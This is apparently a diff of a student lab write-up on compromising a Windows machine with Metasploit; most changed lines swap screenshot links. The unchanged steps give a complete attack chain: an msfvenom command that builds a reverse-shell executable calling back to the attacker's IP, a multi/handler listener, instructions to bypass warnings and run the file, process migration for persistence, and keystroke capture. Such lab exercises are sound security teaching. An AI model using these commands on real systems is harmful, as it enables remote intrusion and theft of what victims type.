@@ -25,40 +25,45 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
+<img width="848" height="367" alt="image" src="https://github.com/user-attachments/assets/7c7948d5-7eaa-4577-853e-b1e0de061073" />
 
-<img width="765" height="274" alt="image" src="https://github.com/user-attachments/assets/3a36e86d-bb7f-4f53-b098-63e8b04a5cac" />
+
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
+<img width="883" height="351" alt="image" src="https://github.com/user-attachments/assets/258b9e17-062e-4219-9ec4-11c31a6b25ed" />
 
-<img width="604" height="144" alt="image" src="https://github.com/user-attachments/assets/d8c41d84-5dce-48de-a26a-1bb5b8cfde5c" />
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
+<img width="1019" height="680" alt="image" src="https://github.com/user-attachments/assets/869ccc9f-d8bc-4f77-b0ca-6d7a0aab1b70" />
 
-<img width="438" height="66" alt="image" src="https://github.com/user-attachments/assets/7f5ae3e4-7e97-4a15-b9ff-b637d84c1770" />
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
+<img width="1019" height="680" alt="image" src="https://github.com/user-attachments/assets/911203f6-c4cd-4811-a46d-b5db68124b75" />
 
-<img width="378" height="52" alt="image" src="https://github.com/user-attachments/assets/5248d685-34a3-4b75-af41-916994ea6f17" />
 
 Check the status of apache2
 ## OUTPUT:
 
-<img width="764" height="297" alt="image" src="https://github.com/user-attachments/assets/41717b2a-54fc-4ef1-a718-08039d5ca80e" />
+<img width="1007" height="690" alt="image" src="https://github.com/user-attachments/assets/10421cd8-8e45-49f2-9716-d5b99829e131" />
+
 
 Invoke msfconsole:
 ## OUTPUT:
+<img width="674" height="787" alt="image" src="https://github.com/user-attachments/assets/39d4678c-7311-43f3-a503-0fe7179e5405" />
 
-<img width="716" height="760" alt="image" src="https://github.com/user-attachments/assets/c1e49aef-a35f-426d-b370-5277460da53a" />
+
+
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
+<img width="747" height="775" alt="image" src="https://github.com/user-attachments/assets/8c6697ed-6497-4124-96d4-2f2f0074e187" />
 
-<img width="760" height="768" alt="image" src="https://github.com/user-attachments/assets/c5bf62cc-b963-40b9-b71f-17756060984c" />
+
 
 Starting a command and control Server
 use multi/handler
@@ -66,31 +71,37 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 ## OUTPUT:
+<img width="1716" height="910" alt="image" src="https://github.com/user-attachments/assets/50b75f01-2812-4951-aacb-16c47685a177" />
 
-<img width="627" height="167" alt="image" src="https://github.com/user-attachments/assets/e1cfdc89-c6d3-4a88-a1cd-f41ec3eca80f" />
+
+
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
 ## OUTPUT:
+<img width="312" height="229" alt="image" src="https://github.com/user-attachments/assets/19290e13-9058-4e14-ba4d-419781174f96" />
 
-<img width="1536" height="960" alt="Screenshot 2026-08-24 231839" src="https://github.com/user-attachments/assets/82702277-3294-4f80-9118-4ad61070b770" />
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
+<img width="520" height="272" alt="image" src="https://github.com/user-attachments/assets/1b4ef4e4-33c4-443f-8bbc-1cc863afd0f4" />
 
-<img width="1536" height="960" alt="Screenshot 2026-08-24 231939" src="https://github.com/user-attachments/assets/cf87a5ea-e655-4c93-9a43-ec30372286af" />
+
 
 On kali/parrot give the command exploit
 ## OUTPUT:
+<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/08647193-aeea-4247-9f19-8dee0d8829d3" />
 
-<img width="387" height="36" alt="image" src="https://github.com/user-attachments/assets/85224e60-9e62-42e1-9a17-01f779b52592" />
+
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
 
-<img width="1531" height="848" alt="645098381-de88aea1-32d5-4e29-a48d-c80fd744f913" src="https://github.com/user-attachments/assets/118b4f8e-e7fc-4a3e-8d75-6cdc76c39b46" />
+<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/381423f5-32c6-4e61-ac4e-2a61c492041b" />
+
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
 To become more persistent, we'll migrate to a process that will last longer.
@@ -98,25 +109,34 @@ Let's migrate to the winlogon process.
 At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe
+## OUTPUT:
+<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/1cb4479e-17ce-406a-9f09-62be744b751d" />
+
+
 at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
 ## OUTPUT:
+<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/200ca09c-e4ff-4b0b-9989-907c5e4f8978" />
 
-<img width="822" height="160" alt="645098493-1af3dcfc-2372-4730-b168-adbb1f30493a" src="https://github.com/user-attachments/assets/89c692d1-c518-458a-819c-321638abf01e" />
+
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 ## OUTPUT:
 
-<img width="1586" height="881" alt="645098661-5acdcbc2-fcba-4116-9455-0b122e90d44c" src="https://github.com/user-attachments/assets/e6b5576d-9d48-4dc4-be05-621693920511" />
+<img width="407" height="305" alt="image" src="https://github.com/user-attachments/assets/2472473c-e0a4-4373-a151-21065c37569f" />
+
+
 
 keyscan_dump	Shows the keystrokes captured so far
 ## OUTPUT:
 
-<img width="898" height="291" alt="645098772-c0c1862a-8ecb-4cf0-85bb-a23c6c2b6a9b" src="https://github.com/user-attachments/assets/6c52f067-669e-4c55-8977-9e9fc4c2cf0a" />
+<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/52f19cf0-1aac-434e-9eaf-cfaab1fa9625" />
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
+
+
